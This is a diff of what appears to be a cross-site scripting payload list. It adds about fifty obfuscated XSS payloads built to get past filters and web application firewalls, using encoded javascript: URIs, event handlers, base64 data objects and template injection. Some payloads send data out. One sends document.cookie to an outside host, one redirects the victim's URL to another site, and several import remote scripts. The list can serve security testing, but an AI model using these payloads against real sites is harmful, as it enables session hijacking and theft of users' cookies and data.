@@ -1,3 +1,51 @@
-<a"/onclick=(confirm)()>click
-<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
-<--`<img/src=` onerror=confirm``> --!>
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+"%3balert`1`%3b"
+asd"`> onpointerenter=x=prompt,x`XSS`
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=a=alert,a(domain)>click
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=import('//xss/')>click
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+{{constructor.constructor(alert`1`)()}}
+javascript:new%20Function`al\ert\`1\``;
+https://twitter.com/xhzeem/status/1378316651431612422
+https://twitter.com/xhzeem/status/1377992310974218245
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click 
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme 
+tarun"><x/onafterscriptexecute=confirm%26lpar;)// 
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"> 
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<iframe/onload="var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a">
+<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document["cook"+"ie"]' src=x>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+[1].map(alert)   or    (alert)(1)
+<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
+[1].find(confirm)
+<svg/onload=self[`aler`%2b`t`]`1`>
+%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E
+'-[document.domain].map(alert)-'
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"> 
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap
+ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+Wordfence 7.4.2
+<a href=&#01javascript:alert(1)>
+<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
